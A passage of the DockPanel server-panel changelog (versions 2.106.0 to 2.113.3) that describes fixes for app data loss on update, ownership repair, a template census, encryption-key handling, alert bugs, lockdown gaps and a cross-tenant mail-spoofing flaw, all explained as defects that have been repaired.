+data went to `/var/lib/dockpanel/apps/dockpanel-app-<app>/…` while every other part
+of the panel looks under `/var/lib/dockpanel/apps/<app>/…`.
+
+The app kept working, because its mount pointed at the real location. What broke was
+everything else that needed to find it. Deleting the app left the data behind on disk,
+and did so **silently**: the cleanup checked the directory it expected, found nothing
+there, and had nothing to warn about. An app deployed before its template declared a
+volume — the exact population the rescue exists for — was the population it happened to.
+
+Three changes, and the second is what reaches installs already affected:
+
+- The migration is given the app's own name, so new rescues land in the right place.
+- Deletion now follows the container's **mounts** instead of rebuilding a path from its
+  name, and recognises both spellings — so an app migrated by v2.111.0 through v2.113.3
+  has its data cleaned up properly when you remove it, instead of orphaned.
+- An app may no longer be named so that it shadows another app's data directory.
+
+### Fixed — changing an app's image dropped the command it needs to start
+
+Six templates in the catalogue are given an explicit command, because their images
+default to printing usage and exiting. Updating an app kept that command; **changing
+its image discarded it**, so the container came back running the image's own default
+and stopped serving. The comment on that code claimed dropping it matched the original
+deploy — it did the opposite.
+
+The command is now re-derived from the app's template when its image changes. Templates
+without an override still get the new image's own default, which was always the intent.
+
+Affected: ntfy, trivy, minio, cloudflared, keycloak and plausible.
+
+### Fixed — the webmail container lost its accounts on every update
+
+The Roundcube container installed by the Mail stack carries DockPanel's own management
+labels, so it appears on the Apps page and can be updated from there. It named no
+template in the catalogue, and the migration only knew how to preserve data for
+templates it could look up — so it preserved nothing at all. Its image declares no
+volume either, which left its entire SQLite database in the writable layer that a
+recreate deletes: accounts, identities, contacts and preferences, gone on the first
+Update, with no warning.
+
+Webmail now stores that database under `/var/lib/dockpanel/apps/roundcube/`, and an
+existing install has it migrated there the next time it is updated rather than lost.
+
+### Added — the template census now reports data that a recreate cannot follow
+
+An image can declare a path persistent on its own account. Docker honours that with an
+anonymous volume, and a recreate builds the replacement from the original's mounts —
+which know nothing about anonymous volumes. The replacement gets an empty one and the
+app returns at first-run state, its data still on the disk with nothing pointing at it.
+That is the same mechanism as the data loss fixed in v2.111.0, arriving through the
+image rather than through the catalogue, and nothing here looked for it.
+
+The weekly census now inspects every deployed container's own mount table and reports
+any such path. Seventeen templates are recorded as affected today, each with what is
+actually at stake — a scratch directory is not a bundled database — and the census
+fails if an unrecorded one appears, or if a recorded one stops being true.
+
+### Fixed — pressing Update now repairs an app the earlier migration already broke
+
+v2.113.2 stopped the migration handing an app its data back owned by root. It
+could not undo it for anyone it had already happened to, and that limitation was
+stated rather than fixed: `migrate_unmounted_volumes` runs only for a declared
+volume that is **missing**, and the bad migration is precisely what supplied the
+mount. So the people who were harmed and the people the fix reached were
+disjoint sets, and the only remedy was an operator running `chown -R` over SSH —
+which assumes they knew that was the problem.
+
+Updating an app now repairs it. In the same window the migration already uses —
+container stopped, not yet removed — DockPanel walks the app's own data
+directories and hands any **root-owned** path back to the account the image
+declares it runs as. If your app has been failing to start since the last time
+you updated it, this is the release that fixes it, and the update log now says so
+in as many words instead of leaving you to guess.
+
+The rule is deliberately the narrowest one that works:
+
+- **only paths currently owned by root** are reclaimed. A file owned by any other
+  user is left exactly as it is, so an ownership somebody chose on purpose is
+  never rewritten.
+- **only apps whose image runs as a non-root user.** A root-run app has nothing
+  to repair and is not touched at all.
+- **only directories under the panel's own app-data root**, canonicalised and
+  re-checked afterwards, and walked with `lchown` so a symlink in an app's data
+  cannot redirect the change outside the volume.
+- it is a **de-escalation** in every case — from root to the unprivileged account
+  the app already runs as, inside that app's own data directory.
+
+A healthy app pays one directory read per update: the top level is probed first
+and the walk is skipped entirely when nothing there is root-owned, which matters
+for a database whose data directory holds tens of thousands of files.
+
+All three doors that recreate a container — Update, changing the image, and
+editing environment variables — do this, because all three could have caused the
+original damage.
+
+## [2.113.2]
+
+### Fixed — the update rescued an app's data and then handed it back unwritable
+
+v2.111.0 stopped `Update` from destroying the data of an app installed before its
+template declared a volume: on the way through, the data is copied out of the
+container's writable layer onto a bind mount before the container is removed.
+That part works. What it did not do was give the data back to the app.
+
+`docker cp` does not preserve ownership on the way out of a container. It writes
+as the user running it — root, for the agent — and `--archive` does not change
+that either. The migration then chowned the volume *directory* and nothing
+inside it, because that chown is deliberately not recursive on the deploy path,
+where the directory may hold data an earlier deployment wrote. So every file the
+migration had just rescued arrived owned by root, and any image running as a
+non-root user died on the first write it attempted.
+
+Reported on #110 by the same person who reported the original data loss, which is
+the uncomfortable part: the repair for their bug is what broke their app the
+second time. On `n8nio/n8n:1` the container exits 1 with
+`EACCES: permission denied, open '/home/node/.n8n/crash.journal'` and
+`SQLITE_READONLY: attempt to write a readonly database`; the panel serves 502.
+
+The migration now chowns every path it wrote, and only those — it already refuses
+to migrate into a directory that is not empty, so everything underneath is
+something it created seconds earlier, and the recursion is bounded by
+construction rather than by care. The walk uses `lchown` and never follows a
+symlink, so a link inside an app's data cannot redirect the chown out of the
+volume. `deploy_app`'s own chown is unchanged and still touches the directory
+alone.
+
+This affects every app whose image runs as a non-root user and was installed
+before its template declared the volume — exactly the population the v2.111.0
+migration exists to rescue. Apps whose images run as root were never affected.
+All three doors go through the one function, so `Update`, changing an app's
+image and editing its environment variables are fixed together.
+
+**Why nothing caught it.** The weekly Template Census only ever deploys fresh,
+into an empty directory the app then fills as itself. It cannot reach the
+migration path, and a green census said nothing about this.
+
+### Corrected
+
+The v2.113.1 note below says the census cannot judge **sixty-one** of the 148
+templates. The number is **sixty-two**, counted independently from the emitted
+catalogue and from the census's own run. The rule it is derived from is
+unchanged, and no template's classification moves.
+
+## [2.113.1]
+
+### Fixed — the new template census could not run, and its exclusion list was wrong by fifty-three
+
+Both defects were in the census added in v2.113.0, and its own first run found
+them. Nothing about the catalogue changed.
+
+**It needs to run as root.** `deploy_app` creates each app's data directory under
+`/var/lib/dockpanel` and chowns it to the uid the image names — both root-only,
+and the agent runs as root in production, so root is the faithful configuration
+rather than a convenience. A GitHub runner is not root, `create_dir_all` fails
+there, and the error is swallowed before `canonicalize` reports the absence — so
+every template in two shards failed identically with
+`Volume path … inaccessible`.
+
+**The exclusion list could never have been right.** The census invents a
+plausible value for a required field the operator would type, so a failure on
+such a template says nothing — it cannot be told apart from a guessed database
+URL pointing at nothing. That set was hand-listed at eight templates. It is
+**sixty-one of the 148**, so the list was wrong by fifty-three the day it
+shipped and would have reported every one of them broken. It is now derived from
+the catalogue: a required field with no default *is* the catalogue saying an
+operator must supply it. A list that has to enumerate a large, moving subset is a
+list that is always wrong.
+
+Those templates are now reported as unjudged, with their failure printed, and
+never asserted on. A consistency check refuses to let a template be listed as
+known-broken when the census cannot support that claim — it caught two
+(`drone`, `azuracast`) immediately, and both are recorded in `FEATURES.md`
+instead.
+
+## [2.113.0]
+
+### Fixed — a bind mount over a path the image ships files at deleted them, and 148 templates had never been run
+
+Every one-click template declares the paths its data lives at, and the panel
+bind-mounts a host directory over each one. Docker pre-populates an empty
+**named volume** from the image's contents at that path. It does not do that for
+a **bind mount**, and never has. So for every template whose image ships files
+where the catalogue mounts a directory, the app started with that directory
+empty — its own default config gone from its point of view.
+
+Same image, same path, same empty storage, differing only in mount type:
+
+```
+bind mount    caddy:2  exit 1   reading config from file: open /etc/caddy/Caddyfile: no such file or directory
+named volume  caddy:2  running  listening on :80, and Docker has put Caddyfile in the volume
+```
+
+Deploys now seed an empty volume directory from the image itself, which is what
+Docker would have done. It reads the image's own bytes rather than a starter
+config written here — a config this project maintained by hand would be a copy
+that rots the next time upstream changes its defaults. It writes only into a
+directory that is empty, so existing data is never touched, and it refuses any
+archive entry that tries to escape that directory.
+
+### Fixed — six templates that could not start
+
+Found by running all 148, not by reading them:
+
+- **Ghost** could never start. `ghost:5` sets `NODE_ENV=production`, whose default
+  database client is MySQL, so it dialled `127.0.0.1:3306` inside its own network
+  namespace and exited. The catalogue asked for a Site URL and nothing else —
+  there was no field an operator could have filled in. It now runs on SQLite, in
+  the volume the template already persists.
+- **Element Web** could not be *created*: its volume named `/app/config.json`, a
+  file, and Docker refuses to mount a directory onto a file. The deploy failed
+  before anything started.
+- **File Browser** had the same mistake one step later, exiting with
+  `open /database/filebrowser.db: is a directory`. It now mounts the parent
+  directory, which also means its users and shares survive an update.
+- **Traefik** published 8080, where nothing listens. Traefik with no configuration
+  creates exactly one entryPoint, on :80; the :8080 one exists only when the
+  insecure API is enabled. Corrected to 80 — deliberately not by enabling that
+  API, which would publish an unauthenticated admin interface.
+- **Caddy** and **Verdaccio** are fixed by the seeding above.
+
+### Fixed — Plausible pinned an abandoned image and asked for no database
+
+`plausible/analytics:v2`, `:v2.0`, `:v2.0.0` and `:latest` all resolve to one
+digest last pushed on **2023-07-12**, and nothing has been published to that
+repository since; the Docker Hub page carries no deprecation notice, so it still
+reads as the current install path. Upstream moved to
+`ghcr.io/plausible/community-edition`. The template also asked for neither of the
+two databases Plausible requires, so it defaulted to compose service names that
+resolve to nothing and crashed. It now pins the current image, asks for both
+database URLs, and runs upstream's own migration command.
+
+### Added — a weekly census that starts every template and checks it serves
+
+Every existing check over the catalogue reads the source. None could answer
+whether pressing Deploy produces something that works, and nothing in this
+repository changes when the answer stops being yes — an upstream image adds a
+required setting or drops its embedded database, and an entry that was correct
+last week is wrong today with no commit in between. The last three releases to
+touch this file each repaired it by hand, after a person read it.
+
+`Template Census` deploys every template through the real deploy path, weekly and
+on any change to the catalogue. Templates that genuinely cannot work standalone
+are listed in the source with the reason, so the check goes red on *new* breakage
+rather than staying permanently red — and it also reports when a listed template
+starts working, so the list cannot quietly stop describing anything.
+
+Nine templates remain broken and are recorded rather than claimed fixed: vector,
+garage, erpnext, azuracast, drone, dozzle, authelia, flowise and wazuh. Each row
+says what is actually wrong. Two of them — dozzle, which needs the Docker socket
+this panel deliberately does not mount, and erpnext, which needs a bench site no
+environment value can create — are candidates for withdrawal rather than repair.
+
+### Added — the catalogue is now emitted as data
+
+`tests/fixtures/app-templates.json` is generated from the catalogue, with a test
+that fails when the two disagree. Checks no longer have to parse Rust, which is
+why one of them had to open by asserting the catalogue still parses at all.
+
+## [2.112.0]
+
+### Fixed — setting `SECRETS_ENCRYPTION_KEY` destroyed every stored credential
+
+The panel supports a dedicated `SECRETS_ENCRYPTION_KEY` so that credential
+encryption does not depend on `JWT_SECRET`. Setting it on an install that
+already held data was silent, irreversible data loss.
+
+Key derivation was an if/else, not a union. With the variable unset the panel
+encrypts with `HKDF(jwt_secret)`; the moment the variable was set, derivation
+returned `HKDF(env)` instead — and `HKDF(jwt_secret)`, the key everything on
+disk had actually been encrypted with, was in **no arm of the decrypt chain at
+all**. Decryption then failed for every stored credential at once.
+
+What that failure did depended on where it landed, and neither half was
+visible:
+
+- Nineteen call sites take the decrypted value and use it as a password. The
+  fallback handed back the stored ciphertext verbatim, so those sites
+  authenticated with base64 text. Every remote service rejected it, and nothing
+  was logged panel-side — the failure looked like the remote service's fault.
+- The five TOTP sites failed closed, locking out every account with 2FA on.
+
+The same variable independently keys the Secrets Manager vault through a second
+derivation, which had only two decrypt arms and both were computed from
+whatever that one key source was — so setting the variable also stranded every
+vault secret, including the CMS admin password site creation stores there and
+any value marked for injection into a site's environment. That half failed
+quieter still: most vault reads render a mask or return an empty string rather
+than an error, so an injected `.env` would simply arrive blank.
+
+Nothing in the documentation, the installer or the sample config mentioned the
+variable, which is the only reason this has not happened to anyone.
+
+Four things changed.
+
+- **Key derivation is now an ordered union rather than an if/else**, in both
+  subsystems. Every derivation a value could have been written under stays in
+  the decrypt chain, so adding, changing or removing `SECRETS_ENCRYPTION_KEY`
+  is survivable and reversible — put the old value back and the data reads
+  again. New writes still use the operator's key when they have set one.
+- **A failed decrypt can now tell the two cases apart.** A legacy plaintext
+  credential and a ciphertext no key opens produced the identical error, which
+  is why the fallback was silent. Values we wrote are recognisable by shape, so
+  a key failure is logged at error level naming the variable, while a genuine
+  legacy plaintext is passed through as before.
+- **A re-encryption path**, which did not previously exist in any form:
+  `POST /api/settings/credentials/reencrypt` (admin) rewrites every stored
+  credential and vault secret under the current key, with a matching control in
+  Settings. It is idempotent, reports per-store counts, and a value it cannot
+  read is reported and **left untouched** rather than overwritten.
+- **`SECRETS_ENCRYPTION_KEY` is documented**, including the explicit warning
+  that on v2.111.0 and earlier setting it was irreversible, and that operators
+  on those versions must upgrade before they set it.
+
+Also fixed: `SECRETS_ENCRYPTION_KEY=` exported but blank was treated as a real
+key by the vault while the credential path treated it as unset, so the two
+subsystems disagreed about what had been configured. Both now read it as unset.
+
+## [2.111.0]
+
+### Fixed — pressing Update on a Docker App could destroy the app's data
+
+Reported as [#110](https://github.com/ovexro/dockpanel/issues/110): an operator
+installed n8n, created an account, pressed **Update** under Running Apps, and got
+back an n8n at first-run state. The account, the workflows and the stored
+credentials were gone, and nothing in the panel had warned that they would be.
+
+The guard that was already there is correct and was never the problem. Every
+recreate path removes the old container with `RemoveContainerOptions { v: false }`
+— *keep the volumes* — under a comment saying the data therefore persists. That
+is true of volumes. It is not true of data: a container with no mount keeps its
+state in its own writable layer, and `docker rm` deletes the writable layer
+whatever `v` says. n8n's template declared no volume and the `n8nio/n8n:1` image
+declares none of its own, so there was nowhere for that data to be except the
+layer being deleted.
+
+Four things changed.
+
+- **The templates whose state lives inside the container now say where it is.**
+  `n8n` → `/home/node/.n8n`, `ghost` → `/var/lib/ghost/content`, `redis` →
+  `/data`, `searxng` → `/etc/searxng`, `activepieces` → `/root/.activepieces`.
+  Each path was taken from the project's own documentation or its official
+  compose file, not inferred. Templates whose durable state genuinely lives in an
+  external database — plausible, shynet, litellm, huginn — are deliberately left
+  with none; a volume there would be decoration.
+
+- **Updating an app deployed *before* this release repairs it instead of
+  destroying it.** On the way through a recreate, any path the app's template
+  calls persistent that the container does not mount is copied out of the
+  writable layer onto a bind mount, and the replacement is created with that
+  mount. It runs while the container is stopped but not yet removed — the only
+  window in which the data can still be rescued — and any failure aborts the
+  update **without** removing the container, which is then left stopped and
+  intact. This is the half that reaches boxes already in the field: declaring a
+  volume fixes the next deploy and does nothing for the container already
+  running. The migration declines rather than merging if the destination
+  directory already holds data, and touches only DockPanel-managed template apps.
+
+- **Blue-green no longer runs two containers against one mount.** It starts the
+  replacement while the original is still serving and only stops the original
+  after the health check and the nginx swap, cloning the old host config and
+  rewriting just the port bindings — so for up to thirty seconds both held the
+  same host paths. Postgres, MySQL and Mongo self-protect with a pidfile lock and
+  merely fail; SQLite has no such lock, so Ghost, Gitea, Bookstack and Vaultwarden
+  could interleave writes from two processes. An app with any mount now takes the
+  brief-downtime path, which is the same one every blue-green failure already
+  fell back to.
+
+- **The recreate endpoints moved onto long verbs.** `/apps/{id}/update`,
+  `/apps/{id}/env` and `/apps/{id}/change-image` pull an image and may now copy
+  data, neither of which fits the default 60-second budget; on the short verb a
+  slow-but-successful update was reported to the operator as a failure while it
+  completed behind them.
+
+Also removed: n8n's `N8N_BASIC_AUTH_USER` / `N8N_BASIC_AUTH_PASSWORD` fields. n8n
+removed basic auth in 1.0 and this template pins `:1`, so the deploy form was
+offering an "Admin Password" that protected nothing. Activepieces gained
+`AP_DB_TYPE=PGLITE` and `AP_REDIS_TYPE=MEMORY`, without which it targets an
+external Postgres and Redis that this single-container template does not deploy —
+and without which its new volume would have been inert.
+
+### Fixed — the mail installer's 60-second budget, and a banner that named half the causes
+
+The same reporter, on the same issue: *"Mail server is installed but not running.
+Check Postfix and Dovecot services."*
+
+`POST /mail/install` installs six apt packages and restarts three services, and it
+was dispatched on the 60-second verb — shorter than the work on any ordinary
+uplink. The panel reported failure while apt carried on and finished, leaving a
+box that is genuinely half-installed. The same was true of the mail uninstaller,
+the rspamd installer, the webmail installer and the PowerDNS installer; all five
+now use the long verb.
+
+The banner itself was the second half. The agent computes `running` from **four**
+terms — Postfix, Dovecot, OpenDKIM and whether OpenDKIM's config was ever
+written — and the sentence named two of them. An operator whose Postfix and
+Dovecot were both `active` was sent to check them, found nothing wrong, and had
+learned nothing. The response already carried the per-service detail; the page
+was discarding it. The banner now names the component that is actually stopped,
+or says the setup did not finish when that is what happened.
+
+### Testing
+
+New `app-data-persistence-pin-e2e.sh`, 38 assertions. §A is a census rather than
+a list: it enumerates from source every function that both removes and creates a
+container, and requires each to either migrate before it removes or carry a
+written exemption — so a fourth recreate path added later is judged too. That
+census immediately found three paths beyond the three under repair, each
+adjudicated in the suite. 21 mutations, 21 killed, each by the arm it names; two
+of those mutations found real defects in the suite's own arms first.
+
+## [2.110.0]
+
+### Fixed — the lockdown blocked the terminal, said so on the page, and left a second shell open
+
+DockPanel has two surfaces that hand an operator a live shell. The Terminal page
+is one. The other is the shell console on the Apps page, which posts a command
+string the agent runs as `docker exec <container> sh -c <command>`.
+
+A lockdown refused the first at three doors and the second at none. It could not
+have refused it: the handler bound its application state as `_state`, so it was
+structurally incapable of asking whether a lockdown was in force. Meanwhile
+`GET /api/security/lockdown` reported `terminals_blocked: true`, and the Security
+page rendered that as a reassurance — a field introduced specifically so that
+"the page and the gate cannot drift apart".
+
+`require_admin` was not the mitigation it resembled. A lockdown is declared
+precisely when an admin session is believed compromised — that is what the
+suspicious-event threshold detects — so the role gate is the credential the
+intruder is assumed to hold. The reasoning was already written down at the
+terminal mint: refusing one live session on the host while permitting another
+"would leave the flag half-honoured in the direction that helps an intruder".
+
+Both container-shell doors now consult the terminal module's own predicate,
+before dispatching to the agent, so they cannot answer differently from the three
+that already did. The shell-availability probe is included: the agent answers it
+by running `docker exec <container> which bash`, which is execution on the host
+and the step the console takes immediately before opening a shell.
+
+### Fixed — a staging environment could be created during a lockdown, without limit
+
+Four handlers write a `sites` row. Two of them refuse during a lockdown and
+enforce the per-hour creation ceiling; when a previous release gave the second of
+those the guards the first already had, it recorded the rule in general terms —
+that a handler creating a site "must enforce the SAME admission controls
+`create()` does — otherwise it is a `create()` with none of the guards" — and
+reached only as far as the sibling in its own file.
+
+Staging creation, in another module, had neither guard. A per-parent uniqueness
+check bounds a tenant to one staging environment per site, which is why this
+never resembled mass creation, but the bound is per parent rather than per
+tenant: an account holding many sites could mint that many more rows, each with a
+vhost and a cloned document root, while the panel was locked down.
+
+It now carries both, using the same predicate and reading the ceiling from the
+one definition rather than a second copy of the number. The bulk importer — the
+fourth door, and the only one that writes sites in bulk — gains the lockdown
+refusal at its entry point and is deliberately exempt from the ceiling, with the
+reason recorded: an import is an operator asking for many sites from a source
+they named, and a limit of three would break the feature rather than guard it.
+
+### Fixed — the panel's own URL could be read but never set
+
+Alert notifications build an "Open runbook" link from a `base_url` setting. The
+key was read from the settings table, absent from the list of keys the settings
+API accepts, and absent from the settings page — so the lookup fell through to an
+environment variable no interface mentions and then to the empty string, and the
+payload builder answers an empty base by omitting the link rather than by
+failing.
+
+Every alert therefore shipped without its runbook link, on every install that had
+not set that variable, with nothing to tell an operator it was missing. `base_url`
+is now settable, validated as an absolute HTTP(S) URL, and has a field on the
+General settings tab. Empty remains legal and is the documented "no link" state.
+
+### Added — a regression pin that censuses the doors rather than listing them
+
+`lockdown-door-census-pin-e2e.sh` enumerates every handler that proxies to a
+container-execution endpoint and every handler that writes a `sites` row, then
+judges each one, so a door added later is judged too. It also asserts that the
+execution handlers remain *able* to consult the lockdown, because the defect
+above shipped as a binding rather than as a missing call, and an arm that checks
+only for the call would have stayed green on it.
+
+## [2.109.0]
+
+### Fixed — one container recovering resolved every other container's alert
+
+`alert_state` is keyed `(server_id, alert_type, state_key)`, and every
+per-entity caller passes a real key: the service name, the container name, the
+GPU index. The `alerts` table had no such column, so `resolve_alert` could only
+scope its UPDATE to `(user_id, server_id, alert_type)`.
+
+With two containers down on one server there are two firing `container_down`
+rows. The first container to recover cleared its own `alert_state` row
+correctly — and then resolved **both** alert rows. The second container was
+still down, its alert now read `resolved`, and because its `alert_state` row
+stayed `firing` the engine never re-announced it: a transition-triggered engine
+cannot re-fire a condition it believes it has already fired. The remaining
+outage became invisible to the panel, to `check_escalations`, and to the
+operator, permanently.
+
+`alerts` now carries `state_key`, every firing path records it, and the resolve
+path targets one entity. The argument is required rather than defaulted, so a
+new alert type cannot inherit the unscoped behaviour by saying nothing.
+
+### Fixed — a slow-response alert could never be resolved
+
+v2.107.0 gave `slow_response` title-keyed deduplication and no clearing
+counterpart. The identifier appeared exactly twice in the whole tree, both
+inside the one INSERT that created it. So a single slow check fired a row that
+stayed `firing` for ever: visible to `check_escalations` through
+`idx_alerts_escalation_sweep`, which kept paging on-call about a site that had
+recovered hours earlier, while the dedup guard read that same stuck row and
+suppressed every future slow-response alert for that monitor. One row both paged
+for ever and blinded the check that produced it.
+
+The recovery path now clears it when the response time returns under the
+threshold, and deduplication keys on the monitor's id rather than on its title —
+renaming a slow monitor used to raise a second alert for the same subject and
+leave the first unreachable. A migration retires the rows that could never be
+cleared; a monitor that is genuinely still slow re-fires within one interval.
+
+### Fixed — a recovery notice for something that was never firing
+
+`resolve_alert` discarded the result of its own UPDATE and notified
+unconditionally, and two auto-healer callers reach it without checking whether
+anything was firing first. A successful heal on a server that had raised no
+alert still sent "DockPanel Resolved: …" on every channel. The notice is now
+sent only when the UPDATE actually resolved something, and a failed UPDATE is no
+longer treated as a recovery.
+
+### Fixed — muting an alert type silenced the page but not the recovery
+
+The per-type mute was applied on the firing path and skipped on the resolve
+path, so a muted type delivered "Resolved: X" for an X the operator was never
+told about. Both paths now share one mute check.
+
+### Fixed — reopening an incident kept its resolution timestamp
+
+`resolved_at` survived the transition back to a live status, on both write
+paths, so the public status page rendered "Resolved *n* ago" for an incident
+whose own status read `investigating` — the page contradicted itself and the
+more prominent half was the reassuring one. Reopening now clears the stamp;
+`postmortem`, which follows a resolution rather than undoing it, keeps it.
+
+### Fixed — the published endpoint count disagreed with its own stated owner
+
+`docs/api-reference.md` opened by advertising 807 REST endpoints (525 backend +
+282 agent) in the same sentence that named `FEATURES.md` §Verified Metrics as
+the figure's owner — while that register said 821 (533 + 288), which is what the
+routers actually contain. v2.108.0 corrected the register and the derived
+surface never caught up. This is the class that release shipped a fix for,
+recurring one file over.
+
+## [2.108.0]
+
+### Fixed — a control labelled CONTROL could not see the deletion it named
+
+`system-logs-scope-pin-e2e.sh`'s S10 arm asserted "both endpoints are still
+admin-only" by counting the gate's name across the whole file against a
+threshold of two. The comment stripper it counts through removes comments but
+not the `use` line, so a correct tree counted three. Deleting either handler's
+gate left two, and the arm stayed green — it could only fire when *both* went at
+once, which is the one case nobody was worried about. It missed precisely the
+single-gate deletion it named itself as controlling for, on `GET
+/api/system-logs`, the endpoint that returns every tenant's log rows.
+
+Each handler is now asserted separately, and the enumeration is asserted before
+it is trusted. Proven by deleting each gate in turn: the old arm reported 13
+passed / 0 failed and exit 0 both times; the new one exits 1 and names the
+handler.
+
+### Fixed — the mail installer never applied the configuration it had installed
+
+Every other writer of mail state calls `sync_mail_config`. `mail_install` did
+not, so a box that re-ran the installer kept whatever the sender-login table
+already held — on any box upgrading past v2.106.0, nothing — and stayed
+unprotected until its next mailbox or domain change. The agent's empty-table
+guard is what made this easy to miss: it renders such a box *safe* rather than
+*armed*, so nothing breaks and nothing warns.
+
+The install now applies the configuration as a reported step. It cannot fail the
+install: the `202` is returned before the work starts, so there is no response
+left to carry an error, and the precondition that refuses a rebuild while any
+mail domain names no server is surfaced as a step rather than swallowed.
+
+### Fixed — three of the four programs that download a release never retried
+
+v2.107.0 gave the installer a retry loop for the one failure `curl --retry` does
+not cover: a connection dropped mid-transfer, exit 56, which had aborted three
+real installs against the release CDN. It gave it to the installer only.
+`update.sh`, `agent-self-update.sh` and `deploy-demo.sh` download the same assets
+from the same host and were all still bare — and one bare call was left eleven
+lines below the new function inside `setup.sh` itself, the fetch that decides
+whether any binary gets verified at all.
+
+All four now share the same loop, driven against a server that drops connections
+mid-transfer: an immediate success, a recovery after two exit-56 failures, and a
+permanent failure that gives up after three attempts and leaves no partial file.
+
+### Fixed — published figures that were wrong where readers could see them
+
+- `docs/guides/multi-server.md` described the agent as `~20MB, ~30MB RAM`
+  against a register reading 21 MB / ~35 MB — served on docs.dockpanel.dev for
+  146 days. Neither agent metric had a row in the pin suite's surface map, so no
+  arm could have caught it even if the file had been listed.
+- The marketing site's four meta tags hardcoded `22 MB on disk, ~52 MB of
+  memory`, matching no register row in either figure, while the rest of the site
+  quotes a shared module. They are the first thing a search engine or a social
+  preview renders, and they were in neither the surface map nor the
+  superseded-figures list that already covered both of their neighbours.
+- The route census counted `.route("path"` on a single line, so nine
+  registrations that rustfmt had wrapped were invisible: the published figure
+  read **813 against a real 821**, and drifted further every time a handler list
+  grew long enough to wrap.
+
+### Fixed — the documented way to unsubscribe returned 405
+
+`/api/status-page/unsubscribe` was registered for `POST` only, while the
+handler's own doc comment, the guide's prose and the guide's API table all
+published `DELETE`. Every reader who followed the documentation got a 405, and
+the one method that worked was named on no published surface. The route now
+accepts both. The guide also promised a one-click unsubscribe link in
+notification emails; no such link has ever existed, and the sentence has been
+removed rather than left standing.
+
+## [2.107.0]
+
+### Fixed — re-running the mail installer could refuse every authenticated send
+
+v2.106.0 added a sender-identity check: Postfix consults a table of which login
+may use which envelope sender. The table is an **allow-list** — an address it
+does not list is refused — but the code that armed it was written believing the
+opposite, that an unlisted address is simply not checked. Under that reading an
+empty table is the harmless case. Under the real one it is the total case: it
+authorises nobody, so it refuses everybody.
+
+`mail_install` armed the check against whatever the table file already held, and
+on a server upgrading into v2.106.0 that file does not exist yet — so it held
+nothing. Re-running the mail installer, which is the ordinary thing to do when
+mail looks wrong, would arm an empty allow-list and every authenticated
+submission on the server would be refused with `553` until the next mailbox,
+alias or domain change rebuilt the table. Nothing surfaced the cause.
+
+The installer now declines to arm an allow-list that authorises nobody, and says
+so in the log. A server with no mailboxes has nobody who can authenticate and so
+nothing to protect; its first mailbox arms the check through the normal sync.
+An existing table is still preserved and re-armed across an installer re-run,
+which is what that call was for.
+
+### Fixed — the sender rule is stricter than v2.106.0's own documentation said
+
+Because the premise was wrong in the source, it was wrong in the guide too. The
+rule is: an authenticated client may use an envelope sender only if it is a
+mailbox on this server, or sits at a domain hosted on this server. Anything else
+is refused, including **a subdomain you have not added as its own mail domain**
+(`shop.example.com` is not `example.com`) and any external address — so this
+server cannot be used as an authenticated relay for a domain it does not host.
+That was already the behaviour in v2.106.0; only the documentation was wrong.
+`docs/guides/email.md` now states it, including the subdomain case and what it
+means when the panel's own SMTP relay points at the same server.
+
+### Fixed — the installer's database-credential check could not fail
+
+v2.106.0 added a check that catches an interrupted install leaving the database
+holding one password while `api.env` holds another. The check asked the question
+correctly and asked it down a pipe that cannot answer: `docker exec … psql`
+connects over the container's own socket, and the PostgreSQL image trusts both
+`local` and `host 127.0.0.1/32`, so it succeeds with **any** password — including
+the wrong one the check exists to find. It therefore never fired, and a server in
+that state stayed exactly as broken as before the check existed, with the API
+crash-looping on `password authentication failed`.
+
+Reproduced on a fresh server: a transient download failure aborted the install,
+the documented-safe re-run completed, and the panel could not start. The check is
+now made against the container's own network address, the only path that reaches
+the rule requiring a password — the same rule the API's connection uses. On the
+same broken server, the corrected check reports *"Database rejects this install's
+password — reconciling"* and the panel starts.
+
+### Fixed — the installer gave up on the download error it actually hits
+
+Binaries were fetched with `curl --retry 3`, which does not retry a connection
+dropped mid-transfer. That is exit 56, and it is precisely what the release CDN
+returned on three separate installs across two sessions, each time aborting the
+install. `--retry-all-errors` would cover it but needs curl 7.71, and Ubuntu
+20.04 — which this installer supports — ships 7.68, so the retry is now a shell
+loop: three attempts on any failure, reporting the real exit code when it gives
+up. All three paths were driven before shipping, including the one where the
+error is permanent.
+
+### Fixed — slow-response alerts have never once been recorded
+
+A monitor that is up but responding slower than 5s was meant to raise a warning
+alert. The statement that recorded it could not succeed against any schema: it
+named a column `subject` where the table has `title`, omitted `title` (which is
+`NOT NULL`), and bound a parameter the statement never referenced. Its error was
+discarded, so the failure was silent and total — no Dashboard count, no row on
+the Alerts page, no Prometheus sample, for the whole life of the feature. It
+also attributed the alert to whichever server was registered first rather than
+to the monitor's own site.
+
+Rewritten against the real schema, attributed to the monitor's site, deduplicated
+so an hour of slowness raises one alert instead of one per check, and its error
+is now logged instead of dropped.
+
+## [2.106.0]
+
+### Fixed — any mailbox could send as any other tenant, DKIM-signed
+
+On a box hosting mail for more than one customer, nothing tied the address a
+client authenticated as to the address they put in `MAIL FROM`. Postfix was
+configured with `smtpd_recipient_restrictions` only, which decides who may be
+written *to*; the sender was never checked. So a customer holding one mailbox
+could send mail as any address on any other customer's hosted domain.
+
+It was worse than plain spoofing. OpenDKIM's signing table is keyed on the
+sender's domain alone (`*@{domain}`), and the milter runs on submission as well
+as inbound, so the forged message left the server carrying a **valid DKIM
+signature for the victim's domain**. SPF passed because the mail genuinely came
+from the right host, and DKIM passed because it genuinely was signed by the
+victim's key — so DMARC passed on both legs, at the recipient, on a message the
+victim never sent.
+
+DockPanel now generates `/etc/postfix/sender_login_maps` and enforces
+`reject_authenticated_sender_login_mismatch`. Every mailbox owns its own
+address, and each hosted domain is owned by the mailboxes inside it — which is
+what also covers aliases, catch-alls and invented local parts, since Postfix
+does not reject a sender it can find no owner for. A domain holding no mailbox
+is owned by nobody. Mailboxes **within one domain** may still send as each
+other: they belong to the same customer, so that is not a tenant boundary.
+
+Deliberately the *authenticated* form of the check, so unauthenticated inbound
+mail on port 25 is untouched — a mailing list, a forwarder or a customer's
+external SaaS may legitimately arrive with one of your domains in the envelope
+sender.
+
+Sites' PHP `mail()` and anything else using the local `sendmail` command are
+unaffected: local submission does not pass through these restrictions at all.
+The one configuration that changes behaviour is a panel whose **SMTP relay
+points at its own server** and authenticates as one mailbox while sending as a
+different address — that will now be refused, and should be corrected by
+authenticating as an address on the domain you send from.
+
+**Existing installations are repaired automatically.** The restriction is
+applied with `postconf` from the mail-sync path, so any server already hosting
+mail picks it up on its next mailbox, alias or domain change; a new server is
